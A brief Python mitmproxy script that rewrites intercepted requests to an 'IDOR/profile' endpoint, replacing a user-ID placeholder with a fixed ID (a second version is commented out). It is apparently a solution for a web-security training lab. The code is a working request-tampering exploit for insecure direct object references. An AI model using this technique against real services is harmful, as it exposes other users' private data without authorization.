from mitmproxy import http
from mitmproxy import ctx


def request(flow: http.HTTPFlow) -> None:
  if 'IDOR/profile' in flow.request.url:
    url = flow.request.url.replace('%7BuserId%7D', '2342388')
    flow.request.url = url

# def response(flow: http.HTTPFlow) -> None:
#   if 'IDOR/profile' in flow.request.url:
#     url = flow.request.url.replace('%7BuserId%7D', '2342385')
#     flow.request.url = url
